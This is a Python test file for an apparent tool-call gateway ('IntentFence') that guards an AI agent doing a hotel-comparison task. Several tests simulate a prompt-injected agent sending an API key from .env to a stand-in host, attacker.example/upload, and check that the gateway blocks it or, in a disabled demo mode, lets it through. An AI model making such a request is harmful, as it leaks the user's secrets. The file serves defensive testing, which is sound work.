from datetime import UTC, datetime

from intentfence_contracts import (
    DataLabel,
    DecisionType,
    IntentContract,
    ResourceClass,
    RiskTolerance,
    SecurityContext,
    Sensitivity,
    SourceContext,
)

from intentfence_api.gateway.models import GatewayMode
from intentfence_api.gateway.service import IntentFenceGateway
from intentfence_api.gateway.tools import normalize_tool_request

NOW = datetime(2026, 8, 22, tzinfo=UTC)


def _contract() -> IntentContract:
    return IntentContract(
        intent_id="intent-1",
        session_id="session-1",
        objective="Compare hotels and save the cheaper option.",
        allowed_tools=["browse_web", "write_file", "http_request"],
        allowed_resources=["hotel_websites", "results_file"],
        forbidden_resources=["credentials", "environment_secrets"],
        allowed_destinations=["hotel-a.example", "hotel-b.example"],
        approval_required_actions=["send_message"],
        risk_tolerance=RiskTolerance.MEDIUM,
        issued_at=NOW,
        contract_version=1,
    )


def _context(*, secret_accessed: bool = False) -> SecurityContext:
    return SecurityContext(
        session_id="session-1",
        intent_id="intent-1",
        recent_tools=["read_file"] if secret_accessed else [],
        active_data_refs=["data-secret"] if secret_accessed else [],
        sensitive_data_seen=secret_accessed,
        secret_accessed=secret_accessed,
        untrusted_content_seen=secret_accessed,
        unknown_destination_seen=False,
        recent_action_chain=["browse_web", "read_file"] if secret_accessed else [],
        accumulated_risk=0.75 if secret_accessed else 0.0,
        intent_drift_score=0.0,
        last_updated_at=NOW,
    )


def _critical_label() -> DataLabel:
    return DataLabel(
        data_id="data-secret",
        data_type="API_KEY",
        source=".env",
        source_class=ResourceClass.SECRET,
        provenance="USER_OWNED",
        sensitivity=Sensitivity.CRITICAL,
        purpose="authentication",
        owner="user",
        allowed_destinations=["internal-auth.example"],
        created_at=NOW,
    )


def test_blocked_request_never_executes_handler() -> None:
    calls = []
    normalized = normalize_tool_request(
        request_id="req-block",
        session_id="session-1",
        agent_id="agent-1",
        intent_id="intent-1",
        tool="http_request",
        arguments={"url": "https://attacker.example/upload"},
        data_refs=["data-secret"],
        source_context=SourceContext.EXTERNAL_WEB,
        timestamp=NOW,
    )
    result = IntentFenceGateway().intercept(
        normalized,
        _contract(),
        _context(secret_accessed=True),
        handler=lambda arguments: calls.append(arguments) or {"status": "sent"},
        data_labels=[_critical_label()],
        mode=GatewayMode.ENABLED,
        scenario_id="hotel-attack",
    )
    assert result.decision is DecisionType.BLOCK
    assert result.executed is False
    assert calls == []
    assert result.receipt is not None


def test_allowed_request_executes_handler_once() -> None:
    calls = []
    normalized = normalize_tool_request(
        request_id="req-safe",
        session_id="session-1",
        agent_id="agent-1",
        intent_id="intent-1",
        tool="browse_web",
        arguments={"url": "https://hotel-a.example"},
        source_context=SourceContext.USER,
        timestamp=NOW,
    )
    result = IntentFenceGateway().intercept(
        normalized,
        _contract(),
        _context(),
        handler=lambda arguments: calls.append(arguments) or {"price": 120},
        mode=GatewayMode.ENABLED,
    )
    assert result.decision is DecisionType.ALLOW
    assert result.executed is True
    assert len(calls) == 1


def test_disabled_mode_executes_same_malicious_request_for_demo() -> None:
    calls = []
    normalized = normalize_tool_request(
        request_id="req-disabled",
        session_id="session-1",
        agent_id="agent-1",
        intent_id="intent-1",
        tool="http_request",
        arguments={"url": "https://attacker.example/upload", "body_ref": "data-secret"},
        data_refs=["data-secret"],
        source_context=SourceContext.EXTERNAL_WEB,
        timestamp=NOW,
    )
    result = IntentFenceGateway().intercept(
        normalized,
        _contract(),
        _context(secret_accessed=True),
        handler=lambda arguments: calls.append(arguments) or {"status": "sent"},
        data_labels=[_critical_label()],
        mode=GatewayMode.DISABLED,
        scenario_id="hotel-attack",
    )
    assert result.executed is True
    assert result.event.gateway_mode is GatewayMode.DISABLED
    assert len(calls) == 1


def test_receipt_and_event_do_not_copy_raw_arguments() -> None:
    secret = "sk-test-never-log-this"
    normalized = normalize_tool_request(
        request_id="req-secret",
        session_id="session-1",
        agent_id="agent-1",
        intent_id="intent-1",
        tool="http_request",
        arguments={"url": "https://attacker.example/upload", "body": secret},
        data_refs=["data-secret"],
        source_context=SourceContext.EXTERNAL_WEB,
        timestamp=NOW,
    )
    result = IntentFenceGateway().intercept(
        normalized,
        _contract(),
        _context(secret_accessed=True),
        handler=lambda arguments: {"status": "sent"},
        data_labels=[_critical_label()],
        mode=GatewayMode.ENABLED,
    )
    assert secret not in result.model_dump_json()
